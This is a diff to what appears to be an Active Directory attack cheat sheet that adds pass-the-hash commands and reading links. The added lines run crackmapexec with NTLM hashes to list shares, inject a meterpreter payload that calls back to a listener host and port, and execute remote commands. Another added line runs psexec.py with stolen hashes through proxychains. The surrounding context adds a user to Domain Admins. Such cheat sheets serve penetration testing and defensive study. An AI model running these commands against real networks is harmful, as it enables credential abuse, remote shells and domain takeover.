@@ -31,6 +31,8 @@
 * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 ```bash
 git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
+crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --shares
+crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
 ```
 * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 ```powershell
@@ -157,6 +159,12 @@ set SMBPass nastyCutt3r
 set PAYLOAD windows/meterpreter/bind_tcp
 run
 shell
+
+or with crackmapexec
+cme smb 10.2.0.2 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
+
+or with psexec
+proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
 ```
 
 ### OverPass-the-Hash (pass the key)
@@ -222,4 +230,13 @@ net group "Domain Admins" hacker2 /add /domain
  * [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
  * [Road to DC](https://steemit.com/infosec/@austinhudson/road-to-dc-part-1)
  * [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
- * [Golden ticket](https://pentestlab.blog/2018/04/09/golden-ticket/)
+ * [Golden ticket - Pentestlab](https://pentestlab.blog/2018/04/09/golden-ticket/)
+ * [Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html)
+ * [Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r ](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html)
+ * [Domain Penetration Testing: Using BloodHound, Crackmapexec, & Mimikatz to get Domain Admin](https://hausec.com/2017/10/21/domain-penetration-testing-using-bloodhound-crackmapexec-mimikatz-to-get-domain-admin/)
+ * [Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView)](https://blog.varonis.com/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/)
+ * [Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView](https://blog.varonis.com/pen-testing-active-directory-environments-part-ii-getting-stuff-done-with-powerview/)
+ * [Pen Testing Active Directory Environments - Part III:  Chasing Power Users](https://blog.varonis.com/pen-testing-active-directory-environments-part-iii-chasing-power-users/)
+ * [Pen Testing Active Directory Environments - Part IV: Graph Fun](https://blog.varonis.com/pen-testing-active-directory-environments-part-iv-graph-fun/)
+ * [Pen Testing Active Directory Environments - Part V: Admins and Graphs](https://blog.varonis.com/pen-testing-active-directory-v-admins-graphs/)
+ * [Pen Testing Active Directory Environments - Part VI: The Final Case](https://blog.varonis.com/pen-testing-active-directory-part-vi-final-case/)
